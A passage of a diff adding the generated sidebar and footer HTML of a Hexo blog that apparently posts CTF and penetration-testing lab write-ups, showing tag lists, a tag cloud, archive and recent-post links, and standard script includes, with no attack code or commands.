class="tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/home/" style="font-size: 10px;">home</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/09/18/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/18/home/">home</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/30/linux%E6%8F%90%E6%9D%83/">linux提权</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/19/venus/">venus</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/11/flower/">flower</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 honkerZ<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
